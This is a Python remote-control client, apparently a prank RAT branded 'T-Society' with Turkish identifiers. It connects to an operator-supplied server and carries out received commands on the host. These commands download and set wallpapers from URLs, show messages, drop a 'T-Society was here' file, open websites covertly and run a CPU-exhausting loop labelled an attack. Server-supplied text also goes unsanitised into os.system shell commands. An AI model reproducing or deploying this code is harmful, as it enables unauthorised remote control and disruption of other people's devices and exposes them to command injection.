import socket
import platform
import os
import urllib.request
import ctypes

def cihaz_tipi():
    sistem = platform.system()
    if sistem == "Linux":
        if "Android" in platform.platform():
            return "Telefon"
        else:
            return "Linux PC"
    elif sistem == "Windows":
        return "Windows PC"
    elif sistem == "Darwin":
        return "Mac"
    return "Bilinmeyen"

def arkaplan_degistir(url):
    try:
        urllib.request.urlretrieve(url, "arkaplan.jpg")
        if cihaz == "Telefon":
            os.system("termux-wallpaper -f arkaplan.jpg")
        elif cihaz == "Windows PC":
            yol = os.path.abspath("arkaplan.jpg")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3)
        elif cihaz == "Linux PC":
            os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg")
        s.send("[✓] Arka plan değiştirildi\n".encode())
    except:
        s.send("[!] Arka plan değiştirilemedi\n".encode())

def saka_modu(mesaj):
    try:
        if cihaz == "Telefon":
            os.system(f'termux-notification --title "T-Society" --content "{mesaj}"')
        elif cihaz == "Windows PC":
            os.system(f'msg * "{mesaj}"')
        elif cihaz == "Linux PC":
            os.system(f'notify-send "T-Society" "{mesaj}"')
        s.send("[✓] Şaka modu mesajı gönderildi!\n".encode())
    except:
        s.send("[!] Şaka modu başarısız\n".encode())

def google_ac():
    try:
        if cihaz == "Telefon":
            os.system("termux-open-url https://www.google.com")
        elif cihaz == "Windows PC":
            os.system("start https://www.google.com")
        elif cihaz == "Linux PC":
            os.system("xdg-open https://www.google.com")
        s.send("[✓] Google açıldı\n".encode())
    except:
        s.send("[!] Google açılamadı\n".encode())

def dosya_olustur():
    try:
        with open("saka.txt", "w") as f:
            f.write("T-Society buradaydı!")
        s.send("[+] Dosya oluşturuldu\n".encode())
    except:
        s.send("[!] Dosya oluşturulamadı\n".encode())

def saldiri_yap():
    try:
        for _ in range(9999999):
            _ = 9 ** 999
        s.send("[✓] Cihaz kastırıldı\n".encode())
    except:
        s.send("[!] Cihaz kasarırken hata oluştu\n".encode())

def gizli_ac():
    siteler = [
        "https://www.google.com",
        "https://youtube.com",
        "https://www.instagram.com",
        "https://tr.wikipedia.org"
    ]
    try:
        for site in siteler:
            if cihaz == "Telefon":
                os.system(f'termux-open-url {site}')
            elif cihaz == "Windows PC":
                os.system(f'start {site}')
            elif cihaz == "Linux PC":
                os.system(f'xdg-open {site}')
        s.send("[✓] Siteler gizlice açıldı\n".encode())
    except:
        s.send("[!] Gizli açma işlemi başarısız\n".encode())

# === BAĞLANTI ===

cihaz = cihaz_tipi()
SERVER_IP = input("Server IP gir: ")
PORT = int(input("Port gir: "))

s = socket.socket()
try:
    s.connect((SERVER_IP, PORT))
    s.send(f"[+] {cihaz} bağlandı.".encode())
except:
    print("[!] Bağlantı hatası.")
    exit()

# === KOMUT DÖNGÜSÜ ===

while True:
    try:
        komut = s.recv(1024).decode().strip()
        if komut == "google":
            google_ac()
        elif komut == "saldiri":
            saldiri_yap()
        elif komut == "dosya":
            dosya_olustur()
        elif komut.startswith("arkaplan "):
            _, url = komut.split(" ", 1)
            arkaplan_degistir(url)
        elif komut.startswith("saka "):
            _, mesaj = komut.split(" ", 1)
            saka_modu(mesaj)
        elif komut == "gizli":
            gizli_ac()
        elif komut == "exit":
            s.close()
            break
        else:
            s.send("[!] Bilinmeyen komut\n".encode())
    except:
        break
